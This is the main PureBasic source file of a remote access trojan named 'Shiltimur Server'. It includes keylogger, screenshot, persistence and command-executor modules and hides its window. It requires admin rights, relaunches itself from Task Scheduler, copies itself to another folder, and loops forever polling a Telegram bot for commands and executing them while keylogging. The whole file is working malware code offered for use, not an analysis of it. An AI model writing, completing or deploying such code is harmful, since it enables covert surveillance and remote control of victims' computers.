;main file
XIncludeFile "screenshotter.pbi"
XIncludeFile "customtypes.pbi"
XIncludeFile "commandretriever.pbi"
XIncludeFile "commandexecutor.pbi"
XIncludeFile "keylogger.pbi"
XIncludeFile "persistence.pbi"
XIncludeFile "instancechecker.pbi"
XIncludeFile "launcher.pbi"
XIncludeFile "logger.pbi"
EnableExplicit

Define commands.TelegramCommandArrayHolder
Define ubound.i, i.i, msg.TelegramMessage
Define switch.s

switch=ProgramParameter(0)
LogMsg(switch)
If switch="/delay" ;means this instance has been launched by another instance of server.
  Delay(1000)
EndIf



OpenWindow(0,0,0,0,0,"Shiltimur Server Window Title",#PB_Window_Invisible | #PB_Window_NoActivate) ;this is for discovery by persistor

SetCurrentDirectory(GetPathPart(ProgramFilename())) ;set self's directory as the working directory. this saves some headaches. i've used some relative paths.

If Not IsUserAdmin_()
  MessageRequester("Error","This program needs to be run with admin privileges.",#PB_MessageRequester_Error)
  End
EndIf

If ProgramParameter(0)="/task" 
  ;this means we've been executed by task scheduler. fire off new instance of self and exit. this will bring the persistence task's 
  ;state in the scheduler back To "Ready" instead of "Running" which would have been the case if we didn't exit.
  LaunchSelfAndQuit()
EndIf

ExtractParamsFromResource() ;gets parameters from exe resource

If IsAnotherInstanceRunning():End:EndIf ;prevent multiple instances

LaunchFromRightFolder() ;copy self to the right folder and run there.

SetAvailableBotCommands() ;sets available commands to bot. this is just a convenience


Repeat

  doPersistence() ;maintains persistence thread

  RetrieveCommandArray(@commands,10000) ;this could take a max of 10s before returning
  ubound=ArraySize(commands\commandArray()) ;commandArray() is assumed to start at index 1
  For i=1 To ArraySize(commands\commandArray()) ;ArraySize() gives max subscript of the array. like UBound()
    msg=commands\commandArray(i)
    ExecuteCommand(@msg)
  Next
  
  doKeylogging() ;maintains keylog thread
  Delay(1000)

ForEver


; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 33
; FirstLine = 3
; EnableAsm
; EnableThread
; EnableXP
; Executable = stub.exe
; EnablePurifier
; Watchlist = RetrieveCommandArray()>reqURL;RetrieveCommandArray()>reqURL;RetrieveCommandArray()>responseBody